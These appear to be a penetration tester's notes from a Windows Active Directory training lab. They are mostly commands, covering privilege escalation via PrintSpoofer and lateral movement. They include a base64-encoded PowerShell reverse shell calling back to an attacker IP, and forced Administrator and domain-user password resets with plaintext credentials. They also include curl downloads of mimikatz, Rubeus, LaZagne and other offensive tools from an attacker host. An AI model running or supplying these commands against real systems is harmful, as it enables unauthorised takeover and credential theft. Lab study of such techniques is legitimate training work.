- Service account contains `SeImpersonate` and machine is 2019 Windows server, so PrintSpoofer should work
- Upload PrintSpoofer64.exe and
```
cd c:\users\public
curl http://172.16.8.120:8888/windows/PrintSpoofer/PrintSpoofer64.exe -o PrintSpoofer64.exe
```
- and run opening `nc -nvlp 4444`
```
.\PrintSpoofer64.exe -i -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA4AC4AMQAyADAAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```
- move `exe` file to `c:\`
```
mv c:\users\public\PrintSpoofer64.exe c:\PrintSpoofer64.exe
```
- After recieving shell, optionally change password of Administrator user
```
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "admin2220" -AsPlainText -Force)

net user Administrator admin2220
net localgroup "Remote Desktop Users" Administrator /add
```
- after rdp
```
c:\PrintSpoofer64.exe -i -c powershell
```
- Installation
```
curl http://172.16.8.120:8888/windows/Rubeus/binaries/Rubeus.exe -o rub.exe

curl http://172.16.8.120:8888/windows/mimikatz/x64/mimikatz.exe -o mimikatz.exe

curl http://172.16.8.120:8888/windows/nc.exe -o nc.exe

curl http://172.16.8.120:8888/windows/Snaffler/Snaffler.exe -o Snaffler.exe

curl http://172.16.8.120:8888/windows/BloodHound/Collectors/SharpHound.exe -o SharpHound.exe

curl http://172.16.8.120:8888/windows/BloodHound/Collectors/SharpHound.exe -o SharpHound.exe

curl http://172.16.8.120:8888/windows/BloodHound/Collectors/SharpHound.exe -o SharpHound.ps1

curl http://172.16.8.120:8888/windows/PowerSploit/Recon/PowerView.ps1 -o PowerView.ps1

curl http://172.16.8.1201:8888/enum/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe -o winpeas.exe

curl http://172.16.8.120:8888/enum/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1 -o winpeas.ps1

curl http://172.16.8.120:8888/windows/Inveigh/Inveigh.ps1 -o Inveigh.ps1

curl http://172.16.8.120:8888/enum/LaZagne/Windows/LaZagne.exe -o LaZagne.exe

curl http://172.16.8.120:8888/windows/SharpUp/SharpUp.exe -o SharpUp.exe
```
# Change password for `ssmalls`
- import PowerView.ps1
```
$SecPassword = ConvertTo-SecureString 'Gr8hambino!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT.LOCAL\hporter', $SecPassword)

$UserPassword = ConvertTo-SecureString 'admin2220' -AsPlainText -Force

Set-DomainUserPassword -Identity ssmalls -AccountPassword $UserPassword -Credential $Cred
```

